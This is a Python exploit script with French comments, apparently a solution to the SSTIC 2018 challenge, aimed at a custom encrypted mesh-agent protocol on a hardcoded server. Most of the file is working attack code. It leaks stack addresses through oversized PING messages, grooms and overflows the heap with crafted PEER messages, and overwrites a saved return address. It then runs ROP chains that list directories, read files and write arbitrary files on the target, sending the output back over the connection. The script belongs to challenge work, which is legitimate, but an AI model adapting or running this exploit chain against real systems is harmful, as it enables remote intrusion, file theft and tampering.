#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Usage pour énumérer un dossier:
    ./riposte.py --real -l secret

Usage pour lire un fichier:
    ./riposte.py --real -r secret/sstic2018.flag
"""
import argparse
import binascii
import select
import socket
import struct


LOCAL_ADDR = ('127.0.0.1', 31337)
REAL_ADDR = ('195.154.105.12', 36735)
MY_AGENT_ID = 0x1234567800000000


# Clé RSA-2048 utilisée par le script pour se connecter au serveur racine,
# générée par :
#    import Crypto.PublicKey.RSA
#    key = Crypto.PublicKey.RSA.generate(2048)
#    print(key.p, key.q, key.n, key.d, key.e)
RSA_P = int("""
baec 29b5 0346 d1a8 d647 eac3 50b8 88e5 85b8 6704 890e b39f 6735 fcc3 6be9 b44d
b745 d8c2 a52e db31 7bfe c17e fceb 9bb5 1f00 9eca a840 e2a5 4ed3 d9c8 ae13 ef03
a14e 07c1 53ce 321c b43d 3a39 5ee5 00bb 92b8 ac08 f8f2 7dd9 3b53 ac7f df4e 91b8
db12 0eff 73f2 b2fc ccb6 e65b 3a33 b044 a9ce e3cd 7851 a8ea 503b 30f0 c315 1493
""".replace(' ', '').replace('\n', ''), 16)
RSA_Q = int("""
edcc cfb8 4358 fd2d 223a 65fe 75f8 4687 c1db 45f0 e9ae b4ac df89 4f23 8bfe 47a8
9723 ff1d d0c1 9308 2f24 d71c ec09 b162 bbc1 2d5e 84ee 2f99 26b8 ae09 ae44 a98e
c7d9 1e5e b358 6e9e 3ba6 63f1 8b51 8b31 b788 3257 6a10 431c 6ea2 0d39 d192 a22e
6336 1c0a 3915 5e84 ce76 1b33 fa4a 3a3f 3677 a170 f08c 7b36 9777 5d67 d62b e111
""".replace(' ', '').replace('\n', ''), 16)
RSA_N = RSA_P * RSA_Q
RSA_D = int("""
15ae 156d 726c 1ef5 ebc0 79de 60c1 03fe fd88 99f4 1a6c 069f 2694 0cd9 823e 3cf0
f2fc fafe f591 da74 e6d1 c04e 6520 1b44 ceb6 fcfd 1940 ab22 6733 b25f e76d 94fc
506a d8e1 1521 6b80 6996 672e 61d3 42a1 1aa6 55b3 e9f4 fc75 ac34 6d21 5c03 c8d9
0401 9860 5105 4307 8c0a b953 8a4d 6a97 81d1 7d1b 884f 88fd 871c b6cb 0239 be45
a88a 3e82 9a5d 9cdf 9048 9125 a34b 0bcd 16c8 2a6c 2b26 9c67 d758 52c1 d26b 1eb3
24b2 7d5c d030 93d8 b7fb 1b73 0d31 99a3 c25e f438 7349 c4c6 33e3 643f 9795 622e
7467 0648 3e6f 2642 84f6 75ae 10b0 394e b9e1 18a2 39a0 8127 8f6d 6716 596e 1609
42ea 6f14 ec06 92a3 c50d e2bf 3f73 3fb7 bae7 a119 2db6 3f69 4162 4904 e73a 8be1
""".replace(' ', '').replace('\n', ''), 16)
RSA_E = 0x10001
assert (RSA_D * RSA_E) % ((RSA_P - 1) * (RSA_Q - 1)) == 1

def decode_bigint_be(data):
    """Décode un entier grand boutiste à partir de données"""
    return int(binascii.hexlify(data).decode('ascii'), 16)

def encode_bigint_be(value, bytelen=None):
    """Encode un entier grand boutiste dans des données"""
    if bytelen is None:
        bytelen = (value.bit_length() + 7) // 8
    else:
        assert value.bit_length() <= bytelen * 8
    hexval = '{{:0{:d}x}}'.format(bytelen * 2).format(value)
    return binascii.unhexlify(hexval.encode('ascii'))


# Clé AES utilisée pour déchiffrer les messages reçus
AES_KEY_DEC = b'0123456789abcdef'

# Implémentation d'AES 4 tours copiée de
# https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/peoples_square/integral.py
aes_sbox = (
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7,
    0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf,
    0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5,
    0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e,
    0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed,
    0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef,
    0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff,
    0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d,
    0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee,
    0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5,
    0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e,
    0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e,
    0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55,
    0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f,
    0xb0, 0x54, 0xbb, 0x16)

aes_invsbox = [0] * 256
for i in range(256):
    aes_invsbox[aes_sbox[i]] = i

def SubBytes(state):
    state = [list(c) for c in state]
    for i in range(len(state)):
        row = state[i]
        for j in range(len(row)):
            state[i][j] = aes_sbox[state[i][j]]
    return state

def InvSubBytes(state):
    state = [list(c) for c in state]
    for i in range(len(state)):
        row = state[i]
        for j in range(len(row)):
            state[i][j] = aes_invsbox[state[i][j]]
    return state

def rowsToCols(state):
    return [
        [state[0][0], state[1][0], state[2][0], state[3][0]],
        [state[0][1], state[1][1], state[2][1], state[3][1]],
        [state[0][2], state[1][2], state[2][2], state[3][2]],
        [state[0][3], state[1][3], state[2][3], state[3][3]]]

def colsToRows(state):
    return [
        [state[0][0], state[1][0], state[2][0], state[3][0]],
        [state[0][1], state[1][1], state[2][1], state[3][1]],
        [state[0][2], state[1][2], state[2][2], state[3][2]],
        [state[0][3], state[1][3], state[2][3], state[3][3]]]

def RotWord(word):
    return [word[1], word[2], word[3], word[0]]

def SubWord(word):
    return [aes_sbox[word[0]], aes_sbox[word[1]], aes_sbox[word[2]], aes_sbox[word[3]]]

def XorWords(word1, word2):
    return [w1 ^ w2 for w1, w2 in zip(word1, word2)]

def KeyExpansion(key):
    Rcon = [
        [0x01, 0x00, 0x00, 0x00], [0x02, 0x00, 0x00, 0x00], [0x04, 0x00, 0x00, 0x00],
        [0x08, 0x00, 0x00, 0x00], [0x10, 0x00, 0x00, 0x00], [0x20, 0x00, 0x00, 0x00],
        [0x40, 0x00, 0x00, 0x00], [0x80, 0x00, 0x00, 0x00], [0x1B, 0x00, 0x00, 0x00],
        [0x36, 0x00, 0x00, 0x00]]
    Nk = Nb = Nr = 4
    temp = [0, 0, 0, 0]
    w = [0, 0, 0, 0] * (Nb * (Nr + 1))
    for i in range(Nk):
        w[i] = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]]
    for i in range(Nk, Nb * (Nr + 1)):
        temp = w[i - 1]
        if (i % Nk) == 0:
            temp = XorWords(SubWord(RotWord(temp)), Rcon[i // Nk - 1])
        w[i] = XorWords(w[i - Nk], temp)
    return w

def Shiftrows(state):
    state = colsToRows(state)
    state[1].append(state[1].pop(0))
    state[2].append(state[2].pop(0))
    state[2].append(state[2].pop(0))
    state[3].append(state[3].pop(0))
    state[3].append(state[3].pop(0))
    state[3].append(state[3].pop(0))
    return rowsToCols(state)

def InvShiftrows(state):
    state = colsToRows(state)
    state[1].insert(0, state[1].pop())
    state[2].insert(0, state[2].pop())
    state[2].insert(0, state[2].pop())
    state[3].insert(0, state[3].pop())
    state[3].insert(0, state[3].pop())
    state[3].insert(0, state[3].pop())
    return rowsToCols(state)

def galoisMult(a, b):
    p = 0
    for i in range(8):
        if b & 1 == 1:
            p ^= a
        a <<= 1
        if a & 0x100:
            a ^= 0x1b
        b >>= 1
    return p & 0xff

def mixColumn(column):
    temp = [c for c in column]
    column[0] = galoisMult(temp[0], 2) ^ galoisMult(temp[3], 1) ^ \
        galoisMult(temp[2], 1) ^ galoisMult(temp[1], 3)
    column[1] = galoisMult(temp[1], 2) ^ galoisMult(temp[0], 1) ^ \
        galoisMult(temp[3], 1) ^ galoisMult(temp[2], 3)
    column[2] = galoisMult(temp[2], 2) ^ galoisMult(temp[1], 1) ^ \
        galoisMult(temp[0], 1) ^ galoisMult(temp[3], 3)
    column[3] = galoisMult(temp[3], 2) ^ galoisMult(temp[2], 1) ^ \
        galoisMult(temp[1], 1) ^ galoisMult(temp[0], 3)
    return column

def MixColumns(cols):
    return [mixColumn(c) for c in cols]

def mixColumnInv(column):
    temp = [c for c in column]
    column[0] = galoisMult(temp[0], 0xE) ^ galoisMult(temp[3], 0x9) ^ \
        galoisMult(temp[2], 0xD) ^ galoisMult(temp[1], 0xB)
    column[1] = galoisMult(temp[1], 0xE) ^ galoisMult(temp[0], 0x9) ^ \
        galoisMult(temp[3], 0xD) ^ galoisMult(temp[2], 0xB)
    column[2] = galoisMult(temp[2], 0xE) ^ galoisMult(temp[1], 0x9) ^ \
        galoisMult(temp[0], 0xD) ^ galoisMult(temp[3], 0xB)
    column[3] = galoisMult(temp[3], 0xE) ^ galoisMult(temp[2], 0x9) ^ \
        galoisMult(temp[1], 0xD) ^ galoisMult(temp[0], 0xB)
    return column

def InvMixColumns(cols):
    return [mixColumnInv(c) for c in cols]

def AddRoundKey(s, ks, r):
    for i in range(len(s)):
        for j in range(len(s[i])):
            s[i][j] = s[i][j] ^ ks[r * 4 + i][j]
    return s

def oneRound(s, ks, r):
    s = SubBytes(s)
    s = Shiftrows(s)
    s = MixColumns(s)
    s = AddRoundKey(s, ks, r)
    return s

def oneRoundDecrypt(s, ks, r):
    s = AddRoundKey(s, ks, r)
    s = InvMixColumns(s)
    s = InvShiftrows(s)
    s = InvSubBytes(s)
    return s

def finalRound(s, ks, r):
    s = SubBytes(s)
    s = Shiftrows(s)
    s = AddRoundKey(s, ks, r)
    return s

def finalRoundDecrypt(s, ks, r):
    s = AddRoundKey(s, ks, r)
    s = InvShiftrows(s)
    s = InvSubBytes(s)
    return s

def encrypt4rounds(message, key):
    s = [message[:4], message[4:8], message[8:12], message[12:16]]
    ks = KeyExpansion(key)
    s = AddRoundKey(s, ks, 0)
    c = oneRound(s, ks, 1)
    c = oneRound(c, ks, 2)
    c = oneRound(c, ks, 3)
    c = finalRound(c, ks, 4)
    output = []
    for i in range(len(c)):
        for j in range(len(c[i])):
            output.append(c[i][j])
    return output

def decrypt4rounds(message, key):
    s = [message[:4], message[4:8], message[8:12], message[12:16]]
    ks = KeyExpansion(key)
    s = finalRoundDecrypt(s, ks, 4)
    c = oneRoundDecrypt(s, ks, 3)
    c = oneRoundDecrypt(c, ks, 2)
    c = oneRoundDecrypt(c, ks, 1)
    c = AddRoundKey(c, ks, 0)
    output = []
    for i in range(len(c)):
        for j in range(len(c[i])):
            output.append(c[i][j])
    return output


class RecvMsg:
    """Received message"""
    def __init__(self, internal_name, src_agent_id, dst_agent_id, cmd, payload):
        self.internal_name = internal_name
        self.src_agent_id = src_agent_id
        self.dst_agent_id = dst_agent_id
        self.cmd = cmd
        self.payload = payload

    def __repr__(self):
        return 'Recv(%r %#x->%#x cmd %#x [%d] %r)' % (
            self.internal_name,
            self.src_agent_id,
            self.dst_agent_id,
            self.cmd,
            len(self.payload),
            self.payload[:256],
        )

class Conn:
    """Contexte de connexion à un serveur"""
    def __init__(self, ip_addr, agent_id=MY_AGENT_ID):
        self.ip_addr = ip_addr
        self.agent_id = agent_id
        self.sock = socket.create_connection(ip_addr)
        self.iv = 0

        # Échange de clés avec le serveur
        self.sock_send_all(encode_bigint_be(RSA_N, 256))
        peer_rsa_n = decode_bigint_be(self.sock_recv_all(256))

        # Chiffre AES_KEY_DEC avec PKCS #1 v1.5 en envoie
        self.aes_key_dec = AES_KEY_DEC
        padding_length = 253 - len(AES_KEY_DEC)
        padded_key = bytearray(256)
        padded_key[0] = 0
        padded_key[1] = 2
        padded_key[2:255 - len(AES_KEY_DEC)] = b'\x42' * padding_length
        padded_key[255 - len(AES_KEY_DEC)] = 0
        padded_key[256 - len(AES_KEY_DEC):] = AES_KEY_DEC
        encrypted_key = pow(decode_bigint_be(padded_key), RSA_E, peer_rsa_n)
        self.sock_send_all(encode_bigint_be(encrypted_key, 256))

        # Reçoit et déchiffre aes_key_enc
        encrypted_peer_key = decode_bigint_be(self.sock_recv_all(256))
        padded_key = encode_bigint_be(pow(encrypted_peer_key, RSA_D, RSA_N))
        assert len(padded_key) == 255 and padded_key[0] == 2 and padded_key[-17] == 0
        self.aes_key_enc = padded_key[-16:]

    def sock_recv_all(self, size):
        """Reçoit exactement size octets de la connexion TCP"""
        data = self.sock.recv(size)
        if len(data) == size:
            return data
        assert data, "connection close"
        while len(data) < size:
            new_data = self.sock.recv(size - len(data))
            assert new_data, "connection close"
            data += new_data
        assert len(data) == size
        return data

    def sock_send_all(self, msg):
        """Envoie tout le message sur la connexion TCP"""
        assert msg
        size = self.sock.send(msg)
        assert size, "connection close"
        while size < len(msg):
            new_size = self.sock.send(msg[size:])
            assert new_size, "connection close"
            size += new_size
        assert size == len(msg)

    def recv_encrypted(self):
        """Reçoit et déchiffre un message en AES"""
        size = struct.unpack('<I', self.sock_recv_all(4))[0]
        assert 40 + 16 < size <= 0x100000
        msg = self.sock_recv_all(size)
        decrypted = b''
        for iblk in range(1, len(msg) // 16):
            ciphertext = list(msg[16 * iblk:16 * iblk + 16])
            cleartext = decrypt4rounds(ciphertext, self.aes_key_dec)
            for i in range(16):
                cleartext[i] ^= msg[16 * iblk - 16 + i]  # mode CBC
            decrypted += bytes(cleartext)
        assert decrypted.startswith(b'AAAA\xde\xc0\xd3\xd1'), \
            'received wrong signature: %r" % decrypted'
        dest_name = decrypted[8:0x10].strip(b'\0')
        src, dst, cmd, new_size = struct.unpack('<QQII', decrypted[0x10:0x28])
        assert 40 <= new_size < size
        payload = decrypted[40:new_size]
        resp = RecvMsg(dest_name, src, dst, cmd, payload)
        print("[DEBUG] RCV %r" % resp)
        return resp

    def has_data(self, delay=.1):
        rlist, _, _ = select.select([self.sock.fileno()], [], [], delay)
        return self.sock.fileno() in rlist

    def try_recv(self, delay=1):
        if self.has_data(delay=delay):
            return self.recv_encrypted()

    def send_encrypted(self, payload):
        """Chiffre et envoie des données"""
        if len(payload) % 16:
            payload += b'\0' * (16 - (len(payload) % 16))
        encrypted = struct.pack('>QQ', self.iv >> 32, self.iv & 0xffffffff)
        for iblk in range(len(payload) // 16):
            plaintext = list(payload[16 * iblk:16 * iblk + 16])
            for i in range(16):
                plaintext[i] ^= encrypted[16 * iblk + i]  # mode CBC
            ciphertext = encrypt4rounds(plaintext, self.aes_key_enc)
            encrypted += bytes(ciphertext)
        self.sock_send_all(struct.pack('<I', len(encrypted)) + encrypted)
        self.iv += 1

    def send_msg_with_len(self, dst, cmd, payload, src=None, length=None):
        """Chiffre et envoie un message, avec une taille spécifiée"""
        if payload is None:
            payload = b''
        if src is None:
            src = self.agent_id
        print("[DEBUG] SND cmd %#x->%#x %#x %r(%d)" % (
            src, dst, cmd, payload[:30], length))
        self.send_encrypted(
            b'AAAA\xde\xc0\xd3\xd1babar007' +
            struct.pack('<QQII', src, dst, cmd, length + 40) +
            payload)

    def send_msg(self, dst, cmd, payload=None, src=None):
        """Chiffre et envoie un message"""
        if payload is None:
            payload = b''
        self.send_msg_with_len(dst, cmd, payload, src, len(payload))

    def sr(self, dst, cmd, payload=None, src=None, delay=1):
        """Envoie un message puis reçoit un autre"""
        self.send_msg(dst, cmd, payload, src=src)
        return self.try_recv(delay)

    def kill_now(self):
        """Tue la connexion en envoyant un message rejeté"""
        self.send_msg_with_len(0, 0x100, b'', length=0x8000)
        self.sock.close()

    def ping(self, dst, message):
        """Requête PING"""
        self.send_msg(dst, 0x100, message)
        return self.try_recv()

    def get(self, dst, path):
        """Requête GET"""
        self.send_msg(dst, 0x204, path + b'\0')
        return self.try_recv()

    def put(self, dst, path):
        """Requête PUT"""
        self.send_msg(dst, 0x202, path + b'\0')
        return self.try_recv()

    def cmd(self, dst, cmdline):
        """Requête CMD"""
        self.send_msg(dst, 0x201, cmdline + b'\0')
        return self.try_recv()

    def reply_cmd(self, response):
        """Réponse CMD_CONTENT"""
        self.send_msg(0, 0x3000201, response)

    def stop_cmd_reply(self):
        """Réponse CMD_DONE"""
        self.send_msg(0, 0x5000201, b'')

    def peer(self, src=None, delay=1):
        """Requête PEER"""
        return self.sr(0, 0x10000, src=src, delay=delay)

    def peer_assert_resp(self, src=None, delay=1):
        """Requête PEER qui doit renvoyer une réponse valide"""
        resp = self.sr(0, 0x10000, src=src, delay=delay)
        assert resp is not None, "PEER time-out"
        assert resp.cmd == 0x1010000

    def peer_no_resp(self, src=None, delay=1):
        """Requête PEER qui ne doit pas renvoyer de réponse"""
        resp = self.sr(0, 0x10000, src=src, delay=delay)
        assert resp is None

    def leak_with_ping(self, dst, offset, do_peer=True):
        """Récupère le contenu de la pile avec PEER et PING"""
        if do_peer:
            self.peer()
        my_payload = b'x' * offset
        self.send_msg_with_len(dst, 0x100, my_payload, length=len(my_payload) + 16)
        resp = self.try_recv(delay=1)
        assert resp.payload.startswith(my_payload)
        return resp.payload[len(my_payload):]

    def leak_msg_addr(self, dst=0, do_peer=True):
        """Récupère l'adresse du message dans mesh_process_message (sur la pile)"""
        leaked_payload = self.leak_with_ping(dst, 0x3fa8, do_peer)
        assert len(leaked_payload) == 16
        return struct.unpack('<QQ', leaked_payload)[1]

    def leak_agent_and_conn_addr(self, dst=0, do_peer=True):
        """Récupère l'adresse de la structure principale de l'agent et
        celle de la connexion active"""
        leaked_payload = self.leak_with_ping(dst, 0x3fb8, do_peer)
        assert len(leaked_payload) == 16
        return struct.unpack('<QQ', leaked_payload)


# Gadgets pour les chaînes de ROP
def u64(x):
    return struct.pack('<Q', x)

ONLY_RET = u64(0x454e8d)
POP_RAX = u64(0x454e8c)
POP_RDI = u64(0x400766)
POP_RSI = u64(0x4017dc)
POP_RCX = u64(0x408f59)
POP_RDX = u64(0x454ee5)
POP_R10 = u64(0x4573d4)
STORE_RAX_TO_RSI = u64(0x489291)  # mov qword ptr [rsi], rax ; ret
SYSCALL = u64(0x47fa05)

LIBC_OPEN = u64(0x454d10)
LIBC_SEND = u64(0x4571b0)
LIBC_ABORT = u64(0x419540)

class Exploit:
    """Exploite une vulnérabilité aboutissant à l'exécution d'une chaîne ROP"""
    def __init__(self, ip_addr, agent_id=None):
        self.ip_addr = ip_addr

        # Initie une première connexion
        c = Conn(ip_addr, agent_id=agent_id or MY_AGENT_ID)
        self.agent_id = c.agent_id
        c.peer(delay=10)

        # Récupère des adresses avec PING
        self.msg_addr = c.leak_msg_addr(do_peer=True)
        self.agent_addr, self.comm_addr = c.leak_agent_and_conn_addr(0, do_peer=True)
        exp_agent_addr = self.msg_addr + 0x4110
        print("Msg address in mesh_process_message = %#x" % self.msg_addr)
        print("Agent structure = %#x (expected %#x)" % (self.agent_addr, exp_agent_addr))
        print("comm structure = %#x" % self.comm_addr)
        print("Try recv ? %r" % c.try_recv())
        assert self.agent_addr == exp_agent_addr

        # Déconnecte le client
        c.kill_now()
        del c

        # Go for it!
        self.expl_libc()

    def unique_agent_id(self, pn, cid):
        """Calcule un ID agent unique pour la connexion pn et l'enfant cid"""
        if cid is None:
            return self.agent_id + (pn << 24)
        return self.agent_id + (pn << 24) + ((cid + 1) << 8)

    def expl_libc(self):
        # Remplit le tcache des structures CONN
        tmp = []
        for i in range(6):
            c = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(1, None))
            resp = c.peer(delay=10)
            assert resp is not None
            tmp.append(c)
        for c in tmp:
            c.kill_now()
        del tmp

        print("Establish 6 connections")
        t0 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(1, None))
        t0.peer_assert_resp(delay=10)
        t1 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(2, None))
        t1.peer_assert_resp(delay=10)
        t2 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(3, None))
        t2.peer_assert_resp(delay=10)
        t3 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(4, None))
        t3.peer_assert_resp(delay=10)
        t4 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(5, None))
        t4.peer_assert_resp(delay=10)
        t5 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(6, None))
        t5.peer_assert_resp(delay=10)

        for cid in range(8):
            t0.peer_no_resp(src=self.unique_agent_id(1, cid), delay=.1)
        for cid in range(8):
            t1.peer_no_resp(src=self.unique_agent_id(2, cid), delay=.1)
        for cid in range(8):
            t2.peer_no_resp(src=self.unique_agent_id(3, cid), delay=.1)
        for cid in range(8):
            t3.peer_no_resp(src=self.unique_agent_id(4, cid), delay=.1)

        print("realloc(t2, 0x80)")
        for cid in range(8, 11):
            t2.peer_no_resp(src=self.unique_agent_id(3, cid), delay=.1)
        t2.peer_no_resp(src=0x61, delay=1)
        t2.peer_no_resp(src=self.unique_agent_id(3, 12), delay=.1)

        print("realloc(t3, 0x80)")
        for cid in range(8, 11):
            t3.peer_no_resp(src=self.unique_agent_id(4, cid), delay=.1)
        t3.peer_no_resp(src=0x91, delay=1)
        t3.peer_no_resp(src=self.unique_agent_id(4, 12), delay=.1)

        for cid in range(8):
            t5.peer_no_resp(src=self.unique_agent_id(6, cid), delay=.1)

        print("Create a free 0x240 chunk without freeing an other connection")
        for cid in range(8, 11):
            t0.peer_no_resp(src=self.unique_agent_id(1, cid), delay=.1)
        t0.peer_no_resp(src=0x241, delay=1)
        t1.kill_now()
        del t1

        print("... and reconnect t1")
        t1 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(2, None))
        t1.peer_assert_resp(delay=10)

        print("Grow t4 after the new blocks")
        for cid in range(8):
            t4.peer_no_resp(src=self.unique_agent_id(5, cid), delay=.1)

        print("Grow t5 more")
        for cid in range(8, 11):
            t5.peer_no_resp(src=self.unique_agent_id(6, cid), delay=.1)
        # Overflow 12th route (no realloc)
        t5.peer_no_resp(src=0x21, delay=1)
        print("realloc(t5, 0x80)")
        t5.peer_no_resp(src=self.unique_agent_id(6, 12), delay=.1)

        print("7th client => realloc route entries")
        t6 = Conn(ip_addr=self.ip_addr, agent_id=self.unique_agent_id(7, None))
        t6.peer_assert_resp(delay=10)

        print("Move t6 right after the route entries")
        for cid in range(8):
            t6.peer_no_resp(src=self.unique_agent_id(7, cid), delay=.1)

        print("Overflow t4 over t5 size")
        for cid in range(8, 11):
            t4.peer_no_resp(src=self.unique_agent_id(5, cid), delay=.1)

        t4.peer_no_resp(src=0x1a1, delay=1)

        print("Expand t5 => realloc(0xa8)")
        for cid in range(13, 17):
            t5.peer_no_resp(src=self.unique_agent_id(6, cid), delay=.1)
        t5.peer_no_resp(src=0x111, delay=.1)

        # Écrase "nombre" et "alloués"
        t5.peer_no_resp(src=0x0200000000, delay=.1)

        # Écrit en IP sauvegardé de mesh_process_message...
        print("Using message buffer at %#lx, saved RIP ...-8" % self.msg_addr)
        t5.peer_no_resp(src=self.msg_addr - 8, delay=.1)
        self.conns = [t0, t1, t2, t3, t4, t5, t6]  # save conns

    def exec_rop(self, rop_chain):
        """Exécute la chaîne de gadgets donnée en paramètre"""
        self.conns[0].send_msg(0, 0x10000, payload=rop_chain, src=0x454e89)

    def ls(self, name='.'):
        """Liste le contenu du dossier indiqué"""
        ropchain_addr = self.msg_addr + 0x28

        rop_data_offset = 0x800
        rop_data = name.encode('ascii') + b'\0'

        ropchain = ONLY_RET * 10
        ropchain += POP_RDI + u64(ropchain_addr + rop_data_offset)
        ropchain += POP_RSI + u64(0o200000)  # O_DIRECTORY
        ropchain += LIBC_OPEN

        # Appelle getdents64 (syscall 217)
        # int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
        #                unsigned int count);
        ropchain += POP_RSI + u64(ropchain_addr + len(ropchain) + 0x10 + 8 + 8)
        ropchain += STORE_RAX_TO_RSI
        ropchain += POP_RDI + u64(0)
        ropchain += POP_RSI + u64(ropchain_addr + rop_data_offset + 8)
        ropchain += POP_RDX + u64(0x4000)
        ropchain += POP_RAX + u64(217)
        ropchain += SYSCALL

        # Appelle send pour envoyer le résultat sur le descripteur de fichier 4,
        # qui correspond à t0
        ropchain += POP_RDI + u64(4)
        ropchain += POP_RSI + u64(ropchain_addr + rop_data_offset + 8)
        ropchain += POP_RDX + u64(0x4000)
        ropchain += POP_RCX + u64(0)
        ropchain += LIBC_SEND
        ropchain += LIBC_ABORT + b'\xcc' * 8

        assert len(ropchain) <= rop_data_offset
        ropchain += b'\0' * (rop_data_offset - len(ropchain))
        ropchain += rop_data
        self.exec_rop(ropchain)
        c = self.conns[0]
        if c.has_data(delay=10):
            data = c.sock.recv(8192)
            print("RECV %r" % (data.rstrip(b'\0')))
            # Décode les structures struct linux_dirent64
            while len(data) >= 20:
                d_reclen, d_type = struct.unpack('<HB', data[16:19])
                if d_reclen == 0:
                    break
                assert d_reclen >= 20
                d_name = data[19:d_reclen].rstrip(b'\0').decode('utf-8', 'replace')
                human_d_type = {
                    1: 'p',
                    2: 'c',
                    4: 'd',
                    6: 'b',
                    8: '-',  # regular file
                    10: 'l',
                    12: 's',
                }.get(d_type, str(d_type))
                print("%2s %r" % (human_d_type, d_name))
                data = data[d_reclen:]

    def read(self, name):
        """Lit le fichier indiqué"""
        ropchain_addr = self.msg_addr + 0x28

        rop_data_offset = 0x800
        rop_data = name.encode('ascii') + b'\0'

        ropchain = ONLY_RET * 10
        ropchain += POP_RDI + u64(ropchain_addr + rop_data_offset)
        ropchain += POP_RSI + u64(0)
        ropchain += LIBC_OPEN

        ropchain += POP_RSI + u64(ropchain_addr + len(ropchain) + 0x10 + 8 + 8)
        ropchain += STORE_RAX_TO_RSI
        ropchain += POP_RDI + u64(0)
        ropchain += POP_RSI + u64(ropchain_addr + rop_data_offset)
        ropchain += POP_RDX + u64(0x4000)
        ropchain += POP_RAX + u64(0)  # read(int fd, void *buf, size_t count)
        ropchain += SYSCALL

        ropchain += POP_RDI + u64(4)
        ropchain += POP_RSI + u64(ropchain_addr + rop_data_offset)
        ropchain += POP_RDX + u64(0x4000)
        ropchain += POP_RCX + u64(0)
        ropchain += LIBC_SEND
        ropchain += LIBC_ABORT + b'\xcc' * 8

        assert len(ropchain) <= rop_data_offset
        ropchain += b'\0' * (rop_data_offset - len(ropchain))
        ropchain += rop_data
        self.exec_rop(ropchain)
        c = self.conns[0]
        if c.has_data(delay=10):
            data = c.sock.recv(8192)
            print("RECV %r" % data.rstrip(b'\0'))

    def write(self, name, content, do_append=True):
        """Ecrit le fichier indiqué"""
        ropchain_addr = self.msg_addr + 0x28

        rop_data_offset = 0x800
        filename_addr = ropchain_addr + rop_data_offset
        rop_data = name.encode('ascii') + b'\0'
        content_addr = ropchain_addr + rop_data_offset + len(rop_data)
        rop_data += content
        ok_addr = ropchain_addr + rop_data_offset + len(rop_data)
        rop_data += b'ok'

        ropchain = ONLY_RET * 10
        ropchain += POP_RDI + u64(filename_addr)
        # /usr/include/asm-generic/fcntl.h :
        # O_WRONLY=1, O_CREAT=0o100, O_TRUNC=0o1000, O_APPEND=0o2000
        ropchain += POP_RSI + u64(0o2101 if do_append else 0o1101)
        ropchain += POP_RDX + u64(0o777)
        ropchain += LIBC_OPEN

        ropchain += POP_RSI + u64(ropchain_addr + len(ropchain) + 0x10 + 8 + 8)
        ropchain += STORE_RAX_TO_RSI
        ropchain += POP_RDI + u64(0)  # overwritten
        ropchain += POP_RSI + u64(content_addr)
        ropchain += POP_RDX + u64(len(content))
        ropchain += POP_RAX + u64(1)  # write(int fd, const void *buf, size_t count)
        ropchain += SYSCALL

        ropchain += POP_RDI + u64(4)
        ropchain += POP_RSI + u64(ok_addr)
        ropchain += POP_RDX + u64(2)
        ropchain += POP_RCX + u64(0)
        ropchain += LIBC_SEND
        ropchain += LIBC_ABORT + b'\xcc' * 8

        assert len(ropchain) <= rop_data_offset
        ropchain += b'\0' * (rop_data_offset - len(ropchain))
        ropchain += rop_data

        assert len(ropchain) < 0x3f00  # Impose des contraintes de taille
        self.exec_rop(ropchain)
        c = self.conns[0]
        if c.has_data(delay=10):
            data = c.sock.recv(8192)
